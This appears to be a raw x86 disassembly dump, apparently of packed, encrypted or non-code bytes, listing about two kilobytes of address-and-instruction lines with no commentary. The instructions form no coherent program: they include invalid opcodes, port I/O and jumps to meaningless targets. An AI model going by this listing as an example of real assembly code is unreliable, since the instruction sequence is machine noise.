  4056e7:	int    0xd7
  4056e9:	in     al,0x9
  4056eb:	sbb    esp,DWORD PTR [ecx-0x7c]
  4056ee:	test   DWORD PTR [ebp-0x46],ebx
  4056f1:	jno    0x40571c
  4056f3:	in     al,0xf2
  4056f5:	mov    ecx,0x7e65562a
  4056fa:	(bad)  
  4056fb:	(bad)  
  4056fd:	push   ss
  4056fe:	fiadd  WORD PTR ds:0xad9919d8
  405704:	xchg   esi,eax
  405705:	mov    eax,edi
  405707:	sub    dl,BYTE PTR [ebp-0x2f]
  40570a:	mov    edx,0x3462aada
  40570f:	not    BYTE PTR [esi+0x7896dff5]
  405715:	cmc    
  405716:	test   BYTE PTR [ebx-0x2f825ff],al
  40571c:	inc    esi
  40571d:	hlt    
  40571e:	jle    0x405718
  405720:	xor    DWORD PTR [eax],esp
  405722:	xchg   esp,eax
  405723:	add    ah,dl
  405725:	mov    cl,0x58
  405727:	add    DWORD PTR [ecx+0x76d2bd13],ebx
  40572d:	mov    ds:0x9d09c3ca,eax
  405732:	call   0x6c7dd087
  405737:	push   ebx
  405738:	pop    edi
  405739:	out    dx,eax
  40573a:	xchg   edi,eax
  40573b:	cmp    al,0xac
  40573d:	dec    esi
  40573e:	pop    edx
  40573f:	inc    eax
  405740:	push   ds
  405741:	int    0x44
  405743:	push   0xffffffb8
  405745:	mov    BYTE PTR [ebx+0x2b5e1815],ah
  40574b:	jnp    0x4057c3
  40574d:	push   0x51
  40574f:	(bad)  
  405750:	mov    WORD PTR [esi-0x2d6cea53],fs
  405756:	and    dl,BYTE PTR [ebp+ecx*4-0x2b]
  40575a:	cwde   
  40575b:	inc    ebp
  40575c:	or     BYTE PTR [eax-0x2f],dh
  40575f:	in     eax,dx
  405760:	mov    al,0x7b
  405762:	push   esi
  405763:	inc    eax
  405764:	xchg   edi,eax
  405765:	sub    bh,BYTE PTR [ebx]
  405767:	daa    
  405768:	jmp    0x405707
  40576a:	(bad)  ds:0x6f11febe
  405770:	xchg   esi,eax
  405771:	pushf  
  405772:	das    
  405773:	in     eax,0xb2
  405775:	push   ecx
  405776:	dec    eax
  405777:	cmp    al,0x45
  405779:	inc    edx
  40577a:	ds and eax,0x3914d02e
  405780:	sbb    DWORD PTR [eax-0x1f],ecx
  405783:	imul   esp,edi,0xffffff95
  405786:	pop    ds
  405787:	xchg   esp,eax
  405788:	jp     0x405800
  40578a:	push   ss
  40578b:	push   ss
  40578c:	stos   BYTE PTR es:[edi],al
  40578d:	cmp    DWORD PTR [ecx],esi
  40578f:	in     eax,0xf
  405791:	loopne 0x405775
  405793:	lods   eax,DWORD PTR ds:[esi]
  405794:	pushf  
  405795:	js     0x4057df
  405797:	int3   
  405798:	jge    0x4057c9
  40579a:	or     al,0x7e
  40579c:	and    esp,DWORD PTR [ebx-0x7487cff6]
  4057a2:	lds    ebx,FWORD PTR [edx]
  4057a4:	retf   
  4057a5:	xchg   ebp,eax
  4057a6:	je     0x40578a
  4057a8:	push   ecx
  4057a9:	and    al,0x72
  4057ab:	nop
  4057ac:	add    DWORD PTR [ebx],ebx
  4057ae:	push   edi
  4057af:	retf   
  4057b0:	pop    eax
  4057b1:	adc    bl,BYTE PTR [esi-0x1575c56]
  4057b7:	out    dx,eax
  4057b8:	in     al,0xd8
  4057ba:	jnp    0x40574b
  4057bc:	xchg   BYTE PTR [edi+edi*4],cl
  4057bf:	gs push es
  4057c1:	fwait
  4057c2:	pop    ecx
  4057c3:	inc    ecx
  4057c4:	sbb    DWORD PTR [edi+0x644811b6],0x2e
  4057cb:	bound  ebp,QWORD PTR [ebp+0x5ff10080]
  4057d1:	das    
  4057d2:	xor    dh,bl
  4057d4:	jle    0x405826
  4057d6:	fild   DWORD PTR [edx+0x2a37c529]
  4057dc:	jmp    0x4057da
  4057de:	mov    edi,0x7ae7d772
  4057e3:	or     DWORD PTR [esi+0x2424a64a],ebx
  4057e9:	add    al,0x98
  4057eb:	add    eax,DWORD PTR [ebx-0x40]
  4057ee:	xchg   ebp,eax
  4057ef:	icebp  
  4057f0:	jg     0x4057e1
  4057f2:	xchg   ebp,eax
  4057f3:	jp     0x405794
  4057f5:	xchg   edi,eax
  4057f6:	in     eax,0x4b
  4057f8:	push   edx
  4057f9:	sahf   
  4057fa:	jle    0x40579e
  4057fc:	clc    
  4057fd:	adc    bh,BYTE PTR [eax+0x32d4d988]
  405803:	mov    ah,0xe4
  405805:	icebp  
  405806:	ja     0x4057de
  405808:	das    
  405809:	jg     0x405871
  40580b:	outs   dx,BYTE PTR ds:[esi]
  40580c:	cmc    
  40580d:	sub    ecx,DWORD PTR [ebx+0x751d7923]
  405813:	dec    ecx
  405814:	adc    dl,BYTE PTR [ebx+ebx*8]
  405817:	adc    al,ch
  405819:	js     0x405839
  40581b:	dec    edx
  40581c:	sub    BYTE PTR [edx-0x3d],ah
  40581f:	outs   dx,BYTE PTR ds:[esi]
  405820:	jbe    0x405803
  405822:	loope  0x4057b8
  405824:	pop    es
  405825:	dec    eax
  405826:	inc    ebp
  405827:	pop    esp
  405828:	sub    BYTE PTR [eax-0x25cc2496],al
  40582e:	ins    BYTE PTR es:[edi],dx
  40582f:	xor    dh,dl
  405831:	or     DWORD PTR [bx+si-0x1c],ebp
  405835:	(bad)  
  405836:	sti    
  405837:	push   edi
  405838:	lods   eax,DWORD PTR ds:[esi]
  405839:	sub    DWORD PTR [ebx+0x35],0xe2455251
  405840:	fs or  al,0xf3
  405843:	div    BYTE PTR [edx+eax*2+0x2d2a9218]
  40584a:	mov    esi,0xd18c0e31
  40584f:	pusha  
  405850:	and    DWORD PTR [ecx],0x7dc7f525
  405856:	sub    eax,0x5933fad2
  40585b:	mov    ebp,DWORD PTR [esi]
  40585d:	pusha  
  40585e:	dec    esi
  40585f:	imul   ebx,DWORD PTR [ebp+0x13],0xb4cdd805
  405866:	mov    bh,0xee
  405868:	xor    BYTE PTR [esi-0x32c9c7f],al
  40586e:	adc    ah,bl
  405870:	sti    
  405871:	sub    edx,edi
  405873:	cmp    al,0xc6
  405875:	jmp    0x47f0:0x9234b7b2
  40587c:	push   eax
  40587d:	inc    ecx
  40587e:	mov    bh,0x60
  405880:	lahf   
  405881:	int    0x9f
  405883:	call   0x146910cd
  405888:	iret   
  405889:	xor    al,0xa6
  40588b:	push   es
  40588c:	sub    ebp,DWORD PTR [edi+0x52708a61]
  405892:	out    0x8d,eax
  405894:	jle    0x4058e1
  405896:	xor    BYTE PTR [edi],dh
  405898:	repz adc DWORD PTR [edi-0x70],ecx
  40589c:	fbstp  TBYTE PTR [eax+0xa]
  40589f:	stc    
  4058a0:	neg    BYTE PTR [ecx]
  4058a2:	in     eax,dx
  4058a3:	dec    esp
  4058a4:	ror    ch,cl
  4058a6:	inc    edx
  4058a7:	adc    esp,DWORD PTR [edx+0x2]
  4058aa:	pushf  
  4058ab:	cli    
  4058ac:	pop    ebp
  4058ad:	adc    DWORD PTR [edi],ebx
  4058af:	add    DWORD PTR [edi+0x608375e4],ebp
  4058b5:	inc    esp
  4058b6:	jo     0x40590d
  4058b8:	mov    bh,0x73
  4058ba:	in     eax,dx
  4058bb:	das    
  4058bc:	dec    ebp
  4058bd:	imul   esp,DWORD PTR [ebx],0x24bfba77
  4058c3:	xchg   ebx,eax
  4058c4:	arpl   WORD PTR [edi+0x6f],bp
  4058c7:	aas    
  4058c8:	jno    0x4058a0
  4058ca:	adc    bh,al
  4058cc:	pop    edi
  4058cd:	dec    DWORD PTR [ebx+0x26ac23d1]
  4058d3:	mov    edi,0x9c497570
  4058d8:	pop    eax
  4058d9:	jno    0x40591b
  4058db:	mov    cl,0x5e
  4058dd:	repz xchg esp,eax
  4058df:	lock mov ch,0xdd
  4058e2:	xchg   BYTE PTR [edi+0x107ef121],cl
  4058e8:	pop    eax
  4058e9:	mov    eax,?
  4058eb:	push   0x56
  4058ed:	jmp    0xc45a7e37
  4058f2:	adc    dh,bh
  4058f4:	cwde   
  4058f5:	xor    DWORD PTR [edx],ecx
  4058f7:	test   ecx,ebx
  4058f9:	pop    es
  4058fa:	fucomip st,st(1)
  4058fc:	jle    0x4058eb
  4058fe:	imul   ebp,DWORD PTR [ebx+0x121395bb],0x6a1894b9
  405908:	and    DWORD PTR [eax],ecx
  40590a:	ja     0x405946
  40590c:	xor    DWORD PTR [ecx-0x3f],edi
  40590f:	or     al,BYTE PTR [ecx]
  405911:	jp     0x4058c6
  405913:	cdq    
  405914:	fdiv   DWORD PTR [edx]
  405916:	jno    0x405935
  405918:	aaa    
  405919:	mov    WORD PTR [edi],ds
  40591b:	jmp    0x405940
  40591d:	iret   
  40591e:	ins    BYTE PTR es:[edi],dx
  40591f:	rol    BYTE PTR [edx],1
  405921:	mov    dh,0x96
  405923:	cmp    bl,BYTE PTR [ebx+0x42aa8ad7]
  405929:	rol    DWORD PTR [edi+0x65],0x2d
  40592d:	clc    
  40592e:	push   ecx
  40592f:	jmp    0x4058b2
  405931:	stc    
  405932:	imul   edx,esi,0xffffffa9
  405935:	add    eax,0x3a4895d6
  40593a:	or     al,BYTE PTR [eax-0x54a8b673]
  405940:	pushf  
  405941:	push   esi
  405942:	mov    ebx,0x6320f1a4
  405947:	mov    dl,0xe3
  405949:	fwait
  40594a:	cdq    
  40594b:	xor    ebx,DWORD PTR [edx+0x74]
  40594e:	sub    ch,0x60
  405951:	mov    bl,0x8e
  405953:	call   0x7670:0x298c2303
  40595a:	inc    eax
  40595b:	sti    
  40595c:	es stos DWORD PTR es:[edi],eax
  40595e:	mov    ds:0xd584db7a,eax
  405963:	in     eax,0x73
  405965:	clc    
  405966:	pop    ecx
  405967:	xchg   edx,eax
  405968:	cmc    
  405969:	repz sti 
  40596b:	add    al,0x1c
  40596d:	sub    DWORD PTR [ecx],edi
  40596f:	or     bh,BYTE PTR ss:[ebp-0x44a0d88a]
  405976:	xchg   esp,eax
  405977:	jo     0x4059a6
  405979:	adc    DWORD PTR [ebp+0x28],0x7532c755
  405980:	cmp    al,0x46
  405982:	adc    al,0x7
  405984:	shl    DWORD PTR ds:0x1f4dd678,1
  40598a:	daa    
  40598b:	test   eax,0x7bdf7498
  405990:	or     DWORD PTR [esi+0x19],0x6d5ccb7e
  405997:	stc    
  405998:	inc    eax
  405999:	stos   BYTE PTR es:[edi],al
  40599a:	es std 
  40599c:	xor    al,0xd
  40599e:	sbb    eax,0x43fbe680
  4059a3:	lods   al,BYTE PTR ds:[esi]
  4059a4:	(bad)  
  4059a5:	cmp    edi,DWORD PTR [ebp+0x36]
  4059a8:	and    esp,edi
  4059aa:	push   esp
  4059ab:	test   DWORD PTR [ebx+0x41f4b403],esi
  4059b1:	jmp    0x4ac8bb42
  4059b6:	popf   
  4059b7:	inc    BYTE PTR [edx-0x7f]
  4059ba:	loope  0x4059b4
  4059bc:	mov    cl,0x50
  4059be:	ret    
  4059bf:	jge    0x405953
  4059c1:	out    0xde,al
  4059c3:	mov    bh,0x9b
  4059c5:	sub    edi,DWORD PTR [edx]
  4059c7:	inc    esi
  4059c8:	rol    bh,0xf1
  4059cb:	or     eax,eax
  4059cd:	jp     0x405993
  4059cf:	pop    edx
  4059d0:	call   edi
  4059d2:	jne    0x405a25
  4059d4:	data16 fidiv WORD PTR [ebp-0x36]
  4059d8:	xchg   edx,eax
  4059d9:	aad    0xb1
  4059db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059dc:	lds    ecx,FWORD PTR [ebp-0x6d]
  4059df:	mov    ecx,0x5678f9a2
  4059e4:	aaa    
  4059e5:	cmp    edi,DWORD PTR [edx-0x67dbba1c]
  4059eb:	cmc    
  4059ec:	xor    ch,ch
  4059ee:	and    bl,BYTE PTR [edx-0x2d543ce2]
  4059f4:	sub    DWORD PTR [ebx-0x2987e92c],esi
  4059fa:	lahf   
  4059fb:	lahf   
  4059fc:	mov    ds:0x87cf9105,eax
  405a01:	mov    dl,0x36
  405a03:	xor    DWORD PTR [edx+ecx*1+0x173d1887],0x6b
  405a0b:	xor    DWORD PTR [ebx+eiz*8],esi
  405a0e:	dec    ebp
  405a0f:	jecxz  0x405a58
  405a11:	or     BYTE PTR [ebx+edx*1],dh
  405a14:	pop    esp
  405a15:	xchg   BYTE PTR [edi+0x37],dh
  405a18:	mov    esi,DWORD PTR [ebx-0x2c]
  405a1b:	xchg   edx,edi
  405a1d:	je     0x4059fc
  405a1f:	mov    ebx,0x25931ea7
  405a24:	jne    0x4059f5
  405a26:	xchg   edi,eax
  405a27:	sub    al,0x2
  405a29:	iret   
  405a2a:	fs jg  0x405a2e
  405a2d:	sahf   
  405a2e:	mov    edx,0x97d61be9
  405a33:	aaa    
  405a34:	ret    0xb656
  405a37:	push   ecx
  405a38:	call   0x9b00:0xf45f0484
  405a3f:	neg    DWORD PTR [edx-0x2412d05c]
  405a45:	cmp    esp,DWORD PTR [ecx]
  405a47:	push   ds
  405a48:	push   cs
  405a49:	sbb    bh,dh
  405a4b:	adc    al,0x45
  405a4d:	imul   edi,eax,0x5d
  405a50:	cld    
  405a51:	rsm    
  405a53:	sbb    bh,BYTE PTR [esi-0x3d]
  405a56:	iret   
  405a57:	mov    ch,0x29
  405a59:	add    al,0xa5
  405a5b:	iret   
  405a5c:	jno    0x405a34
  405a5e:	sbb    ebx,DWORD PTR [eax]
  405a60:	push   eax
  405a61:	ss jge 0x405a6f
  405a64:	add    edx,DWORD PTR [ecx+0x31]
  405a67:	lea    ebx,[eax-0x5851707c]
  405a6d:	ret    
  405a6e:	fmul   st,st(4)
  405a70:	jg     0x405abc
  405a72:	pop    ebx
  405a73:	mov    ebp,0x503e4e2f
  405a78:	sbb    eax,0x1c1331f6
  405a7d:	popf   
  405a7e:	dec    esp
  405a7f:	js     0x405ae1
  405a81:	rcr    dl,cl
  405a83:	sbb    esi,esp
  405a85:	fnstcw WORD PTR [edx-0x5b0de9a4]
  405a8b:	pop    edi
  405a8c:	adc    ebx,DWORD PTR [edi-0x41709191]
  405a92:	call   0x183cb9e6
  405a97:	push   eax
  405a98:	dec    edx
  405a99:	in     al,0x19
  405a9b:	pop    ecx
  405a9c:	ja     0x405aa9
  405a9e:	ins    DWORD PTR es:[edi],dx
  405a9f:	push   ebp
  405aa0:	test   BYTE PTR [edx+edx*4+0x6e],bh
  405aa4:	sbb    DWORD PTR [edx+ebp*4+0x1b],0x6fe1b39d
  405aac:	push   eax
  405aad:	stos   BYTE PTR es:[edi],al
  405aae:	shl    BYTE PTR [esi],0xad
  405ab1:	addr16 in al,0xe3
  405ab4:	mov    eax,0xcd1b51d1
  405ab9:	loopne 0x405b2f
  405abb:	sbb    eax,0x1c88d4a0
  405ac0:	jno    0x405a85
  405ac2:	push   edi
  405ac3:	dec    esp
  405ac4:	pop    ecx
  405ac5:	pop    esp
  405ac6:	jmp    0x405a60
  405ac8:	add    al,0x94
  405aca:	(bad)  
  405acb:	fdivr  QWORD PTR [eax-0x1a]
  405ace:	repnz push esp
  405ad0:	sub    esi,esp
  405ad2:	shl    DWORD PTR [esi],0xd8
  405ad5:	mov    dh,0x61
  405ad7:	push   esp
  405ad8:	mov    esp,0x18f7e6f4
  405add:	mov    ch,0x44
  405adf:	aas    
  405ae0:	mov    BYTE PTR [eax+0x7f],ch
  405ae3:	jmp    0x73b816a3
  405ae8:	fistp  DWORD PTR [edx+0x3d5fa5a1]
  405aee:	add    BYTE PTR [eax],bh
  405af0:	mov    bl,0xda
  405af2:	cdq    
  405af3:	push   ss
  405af4:	pushf  
  405af5:	push   0xffffffbc
  405af7:	mov    ch,0xec
  405af9:	mov    ebp,0xd9d3a74c
  405afe:	jecxz  0x405b73
  405b00:	inc    ebx
  405b01:	push   es
  405b02:	jnp    0x405b16
  405b04:	rcr    BYTE PTR [ebx-0x6d079381],1
  405b0a:	loop   0x405b4f
  405b0c:	mov    ah,0x12
  405b0e:	sub    eax,0x583a79df
  405b13:	adc    BYTE PTR [ebx-0x7cf8f0f3],bh
  405b19:	cmp    BYTE PTR [ecx-0xf],bh
  405b1c:	in     eax,dx
  405b1d:	fs mov cl,0xd6
  405b20:	popa   
  405b21:	xchg   ebp,eax
  405b22:	and    dh,BYTE PTR [ebp-0x31a139ca]
  405b28:	hlt    
  405b29:	mov    al,0x73
  405b2b:	sbb    DWORD PTR [edi+ecx*8],edi
  405b2e:	pushf  
  405b2f:	cmc    
  405b30:	xor    DWORD PTR [esp+ebp*4],esi
  405b33:	xor    eax,0x80372669
  405b38:	sub    BYTE PTR [ebx+0x79],dl
  405b3b:	rcr    edx,0x7a
  405b3e:	mov    bl,0xb6
  405b40:	and    al,0xa7
  405b42:	jnp    0x405b1c
  405b44:	test   BYTE PTR [edx-0x5dc47e9],bh
  405b4a:	test   DWORD PTR [ecx-0x5],0x1e3e08ca
  405b51:	mov    DWORD PTR [edx],0x628aa764
  405b57:	(bad)  
  405b59:	push   ds
  405b5a:	inc    esi
  405b5b:	in     eax,dx
  405b5c:	fcomp  QWORD PTR [ebx+0x53]
  405b5f:	mov    al,ds:0x5daa7db8
  405b64:	push   0x27
  405b66:	pop    edi
  405b67:	arpl   dx,bp
  405b69:	es pop es
  405b6b:	rcr    DWORD PTR [ebp+0x2457602b],0x95
  405b72:	mov    bh,0x72
  405b74:	fild   DWORD PTR [esi+ecx*1+0x2d]
  405b78:	out    0x5b,al
  405b7a:	or     esp,ebp
  405b7c:	cmp    eax,0x9c0bef3f
  405b81:	sti    
  405b82:	daa    
  405b83:	popf   
  405b84:	loop   0x405b2d
  405b86:	mov    dh,0x98
  405b88:	jle    0x405b73
  405b8a:	sbb    al,BYTE PTR [edi-0x7]
  405b8d:	or     eax,0xbfc4e11d
  405b92:	ja     0x405b89
  405b94:	mov    eax,ds:0x671a2b65
  405b99:	icebp  
  405b9a:	jl     0x405b1c
  405b9c:	sahf   
  405b9d:	mov    al,0x3a
  405b9f:	xor    eax,0xeb1c5762
  405ba4:	pop    ds
  405ba5:	mov    WORD PTR [edi-0x7d],ss
  405ba8:	cdq    
  405ba9:	add    BYTE PTR [edx-0x5f],dh
  405bac:	mov    ecx,0x8cf853eb
  405bb1:	ins    DWORD PTR es:[edi],dx
  405bb2:	sbb    DWORD PTR [eax-0x11],ebp
  405bb5:	aas    
  405bb6:	add    DWORD PTR [di-0x73a9],0xcbd5cce8
  405bbf:	mov    ebx,0x2baf845c
  405bc4:	fldenv [edi+0xd]
  405bc7:	inc    ebp
  405bc8:	loope  0x405b69
  405bca:	aam    0xa7
  405bcc:	xchg   edx,eax
  405bcd:	out    dx,al
  405bce:	rcl    cl,1
  405bd0:	ins    BYTE PTR es:[edi],dx
  405bd1:	cdq    
  405bd2:	and    edx,edx
  405bd4:	dec    esp
  405bd5:	scas   al,BYTE PTR es:[edi]
  405bd6:	stos   DWORD PTR es:[edi],eax
  405bd7:	dec    eax
  405bd8:	dec    esp
  405bd9:	pop    edx
  405bda:	pop    ebx
  405bdb:	dec    edx
  405bdc:	cmp    eax,0x5ac01d6a
  405be1:	sbb    edi,DWORD PTR [edi+ebp*2]
  405be4:	imul   ecx,DWORD PTR [ecx+eiz*1-0x2d1ab8b8],0x46
  405bec:	imul   ebp,ebx,0x200ee6f5
  405bf2:	push   edx
  405bf3:	jae    0x405b96
  405bf5:	mov    eax,ds:0x77118a11
  405bfa:	sbb    edi,DWORD PTR [eax]
  405bfc:	sub    eax,0x8805d905
  405c01:	fistp  QWORD PTR [edi-0x14]
  405c04:	std    
  405c05:	and    DWORD PTR [edi],ebp
  405c07:	adc    ch,BYTE PTR [edx]
  405c09:	aas    
  405c0a:	(bad)  
  405c0b:	xchg   esi,eax
  405c0c:	in     al,0x21
  405c0e:	lock push ebp
  405c10:	scas   al,BYTE PTR es:[edi]
  405c11:	xchg   ebx,eax
  405c12:	cmp    ch,BYTE PTR [esi+edi*1]
  405c15:	fist   WORD PTR [esi]
  405c17:	outs   dx,BYTE PTR ds:[esi]
  405c18:	nop
  405c19:	sbb    DWORD PTR ds:0x820e379b,ebp
  405c1f:	(bad)  
  405c20:	cwde   
  405c21:	sbb    BYTE PTR [esp+ebp*2],0x35
  405c25:	mov    bh,0x85
  405c27:	xchg   ecx,eax
  405c28:	sbb    DWORD PTR [ebx+0x19a7c3df],edx
  405c2e:	cmp    eax,0x6ee92612
  405c33:	outs   dx,BYTE PTR ds:[esi]
  405c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c35:	jmp    0x405ca7
  405c37:	mov    ecx,0xb2f1e413
  405c3c:	xchg   DWORD PTR [esi],esp
  405c3e:	jmp    0x405cae
  405c40:	sbb    al,0xc0
  405c42:	adc    DWORD PTR [edi],ecx
  405c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c45:	fwait
  405c46:	ds loope 0x405c3a
  405c49:	add    cl,BYTE PTR [ecx-0x6b25960f]
  405c4f:	pushf  
  405c50:	lods   eax,DWORD PTR ds:[esi]
  405c51:	inc    edx
  405c52:	into   
  405c53:	clc    
  405c54:	jl     0x405ca4
  405c56:	pop    es
  405c57:	outs   dx,DWORD PTR ds:[esi]
  405c58:	pop    esp
  405c59:	repz test al,0x32
  405c5c:	add    eax,0x1f51490c
  405c61:	les    ebp,FWORD PTR [esi+ecx*4-0x25]
  405c65:	push   ss
  405c66:	or     eax,0xb62b60b
  405c6b:	add    dl,BYTE PTR [esi]
  405c6d:	mov    ?,WORD PTR [ebx+ebx*2-0x360ddecb]
  405c74:	sahf   
  405c75:	je     0x405c6b
  405c77:	cmc    
  405c78:	ret    0x28c2
  405c7b:	adc    esp,ebx
  405c7d:	cmp    BYTE PTR [edi],bl
  405c7f:	fxch   st(5)
  405c81:	ins    DWORD PTR es:[edi],dx
  405c82:	xor    DWORD PTR [ebx+ebp*4+0x33],esi
  405c86:	mov    bl,0x8
  405c88:	out    0x51,eax
  405c8a:	bound  ecx,QWORD PTR [ebx+0x43]
  405c8d:	and    al,0x5
  405c8f:	jmp    0xfac8:0x1b95e235
  405c96:	aam    0xbb
  405c98:	pop    esi
  405c99:	sub    BYTE PTR [edx+ebp*8-0x7788b314],ch
  405ca0:	jp     0x405c42
  405ca2:	ficom  WORD PTR [ebp-0x38c57d0a]
  405ca8:	mov    BYTE PTR [esi],ah
  405caa:	shr    ebp,0x61
  405cad:	(bad)  
  405cae:	call   0x56b57fe3
  405cb3:	pushf  
  405cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cb5:	(bad)  
  405cb6:	ja     0x405cd0
  405cb8:	adc    BYTE PTR [esi],dh
  405cba:	inc    esi
  405cbb:	in     eax,dx
  405cbc:	cmp    ch,BYTE PTR [ecx]
  405cbe:	and    ch,al
  405cc0:	aad    0x62
  405cc2:	inc    ecx
  405cc3:	mov    edx,0x64133a75
  405cc8:	pushf  
  405cc9:	call   0x21eeb1ba
  405cce:	push   ds
  405ccf:	cmp    bh,cl
  405cd1:	clc    
  405cd2:	mov    dh,0xad
  405cd4:	sbb    ah,BYTE PTR [edi-0x56]
  405cd7:	push   ebx
  405cd8:	test   eax,0x277f4ada
  405cdd:	pop    ds
  405cde:	pushf  
  405cdf:	push   ss
  405ce0:	fcmovu st,st(5)
  405ce2:	jbe    0x405d1b
  405ce4:	jmp    0x405cb8
  405ce6:	mov    ds:0xa5d5c7e7,eax
  405ceb:	jmp    0xaa59dc88
  405cf0:	shl    BYTE PTR [ebx],cl
  405cf2:	repnz (bad) 
  405cf4:	aas    
  405cf5:	jns    0x405cb1
  405cf7:	shr    DWORD PTR [esi],0xbf
  405cfa:	stos   DWORD PTR es:[edi],eax
  405cfb:	push   0xffffffa1
  405cfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cfe:	ret    
  405cff:	jmp    0x405d08
  405d01:	jle    0x405ccc
  405d03:	in     eax,dx
  405d04:	sub    ah,BYTE PTR [esi-0x2a]
  405d07:	aad    0xad
  405d09:	mov    ecx,0x7bdffa7
  405d0e:	or     eax,0xefaea1a
  405d13:	int    0xb8
  405d15:	jno    0x405d00
  405d17:	cmp    BYTE PTR [esi-0x3942744a],dl
  405d1d:	repnz bound eax,QWORD PTR [edi-0x23]
  405d21:	nop
  405d22:	ror    DWORD PTR [ebx],0x42
  405d25:	and    edx,DWORD PTR [eax]
  405d27:	bound  ebp,QWORD PTR [ebx+0x52757882]
  405d2d:	and    DWORD PTR [ecx-0x3d651637],ebx
  405d33:	das    
  405d34:	mov    cl,0x2f
  405d36:	cmp    al,ah
  405d38:	pop    edx
  405d39:	inc    esi
  405d3a:	daa    
  405d3b:	adc    DWORD PTR [eax-0x285e67fa],eax
  405d41:	sti    
  405d42:	and    eax,0xa37c3eb2
  405d47:	data16 jne 0x405d43
  405d4a:	add    cl,al
  405d4c:	stos   BYTE PTR es:[edi],al
  405d4d:	inc    edx
  405d4e:	aaa    
  405d4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d50:	les    ecx,FWORD PTR [ebx+0xb9742dd]
  405d56:	pop    ecx
  405d57:	aaa    
  405d58:	inc    esi
  405d59:	pusha  
  405d5a:	out    0xf4,eax
  405d5c:	into   
  405d5d:	mov    bl,0x81
  405d5f:	fimul  WORD PTR [ebx]
  405d61:	(bad)  
  405d62:	(bad)  
  405d64:	das    
  405d65:	lock push ebx
  405d67:	scas   al,BYTE PTR es:[edi]
  405d68:	xchg   esi,eax
  405d69:	mov    ch,0x60
  405d6b:	jmp    0x405d79
  405d6d:	icebp  
  405d6e:	or     al,0xdb
  405d70:	in     al,dx
  405d71:	arpl   WORD PTR [ecx],dx
  405d73:	mov    ch,BYTE PTR [edx-0xb21ef9b]
  405d79:	jmp    0x405cff
  405d7b:	dec    ebp
  405d7c:	or     DWORD PTR [ebx+ebx*8-0x3ad7aa50],ecx
  405d83:	cmp    BYTE PTR [ecx-0xc6afd36],ch
  405d89:	sbb    DWORD PTR [esi],ebx
  405d8b:	push   edx
  405d8c:	lea    edx,[ebp+0x75]
  405d8f:	rol    dl,1
  405d91:	(bad)  
  405d93:	cmp    dh,cl
  405d95:	push   0x5bbe6396
  405d9a:	adc    ah,BYTE PTR ds:0x71362391
  405da0:	popa   
  405da1:	test   ax,0x5b77
  405da5:	fisttp DWORD PTR ds:0xc74cf2d6
  405dab:	sar    DWORD PTR [edx+eiz*1],0xa
  405daf:	sub    dl,dh
  405db1:	jp     0x405e0a
  405db3:	adc    al,0x46
  405db5:	test   DWORD PTR [ecx-0x58],0x5cc72013
  405dbc:	shl    DWORD PTR [ecx+ebx*1],1
  405dbf:	pop    edi
  405dc0:	cmp    DWORD PTR [esi],esp
  405dc2:	sbb    eax,0x210f36d9
  405dc7:	(bad)  
  405dc8:	aam    0x5a
  405dca:	aam    0x2e
  405dcc:	scas   eax,DWORD PTR es:[edi]
  405dcd:	inc    esi
  405dce:	fidivr WORD PTR ds:0x37b0d6e
  405dd4:	stos   BYTE PTR es:[edi],al
  405dd5:	sahf   
  405dd6:	mov    al,ds:0xb69800ac
  405ddb:	jl     0x405d81
  405ddd:	pusha  
  405dde:	enter  0x8732,0xe9
  405de2:	test   BYTE PTR [ebp+0xf],dl
  405de5:	sti    
  405de6:	dec    edi
  405de7:	jp     0x405e5b
  405de9:	bound  ebx,QWORD PTR [esi+0x62]
  405dec:	(bad)  [ebp+0x40ebc1e0]
  405df2:	xchg   edi,eax
  405df3:	outs   dx,BYTE PTR ds:[esi]
  405df4:	test   al,0xd
  405df6:	arpl   WORD PTR [edi],sp
  405df8:	rcl    cl,cl
  405dfa:	add    DWORD PTR [ebp-0x1e],ebx
  405dfd:	push   ds
  405dfe:	xor    BYTE PTR [edx+0x63c1e2a4],al
  405e04:	ud1    eax,ebp
  405e07:	pop    eax
  405e08:	mov    ds:0xc4db0f00,al
  405e0d:	add    DWORD PTR [edx],ebp
  405e0f:	outs   dx,BYTE PTR ds:[esi]
  405e10:	js     0x405e09
  405e12:	fiadd  DWORD PTR [ebx-0x77]
  405e15:	into   
  405e16:	sub    eax,0x6d6384ba
  405e1b:	inc    edx
  405e1c:	and    esp,DWORD PTR [ecx+eiz*8]
  405e1f:	sbb    al,0x72
  405e21:	gs fs call 0x8f4f3125
  405e28:	xchg   edi,ecx
  405e2a:	sbb    ecx,DWORD PTR [edi]
  405e2c:	adc    DWORD PTR [ebx],ebp
  405e2e:	lahf   
  405e2f:	dec    esp
  405e30:	jnp    0x405ded
  405e32:	push   0x13
  405e34:	or     ch,BYTE PTR [ebx-0x36]
  405e37:	adc    ebx,ebx
  405e39:	dec    esi
  405e3a:	mov    cl,BYTE PTR [ebp+edx*4-0x8]
  405e3e:	cli    
  405e3f:	dec    ecx
  405e40:	mov    al,ds:0xdf4226b0
  405e45:	cmp    dl,BYTE PTR [esi-0x1fcccbb9]
  405e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e4c:	fisubr WORD PTR [edi-0x23]
  405e4f:	cld    
  405e50:	mov    ah,0x54
  405e52:	test   eax,eax
  405e54:	cmp    eax,0x37a615bc
  405e59:	dec    edi
  405e5a:	ror    BYTE PTR [esi],0x2c
  405e5d:	scas   al,BYTE PTR es:[edi]
  405e5e:	test   DWORD PTR [ebx+eax*1],edx
  405e61:	pop    esp
  405e62:	cmp    al,BYTE PTR [edx+0x21d1dcec]
  405e68:	push   edi
  405e69:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  405e6b:	mov    ds,WORD PTR [esi+0x7b]
  405e6e:	mov    ds:0x6e3d4c78,al
  405e73:	pop    ss
  405e74:	mov    al,0x48
  405e76:	test   al,0x18
  405e78:	clc    
  405e79:	pop    ebp
  405e7a:	sub    bl,cl
  405e7c:	inc    ebp
  405e7d:	pop    eax
  405e7e:	jmp    0x6fd24445
  405e83:	adc    dh,dl
  405e85:	and    bh,BYTE PTR [edx-0x56f12ae4]
